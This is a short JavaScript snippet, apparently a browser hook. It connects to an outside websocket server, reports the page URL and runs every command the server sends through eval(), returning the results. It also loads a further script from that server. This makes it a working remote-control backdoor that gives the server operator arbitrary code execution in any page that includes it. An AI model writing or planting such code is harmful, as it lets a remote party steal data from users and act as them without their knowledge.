window.socket = io.connect("wss://oj.masnn.ml/socket/", { transports: ['websocket'] });
socket.on('setID', function(ID) {
    window.id = ID.toString();
    console.log('Socket server connected, id =', ID);
    socket.emit('init', window.location.href);
    console.log('Initing basic command...');
});
socket.on('command', function(data) {
    console.log(data);
    try {
        socket.emit('command_res', { id: window.id, data: eval(data) });
    } catch (e) {
        socket.emit('command_err', { id: window.id, command: data, err: e });
    }
});
import("/socket/scripts/list.js");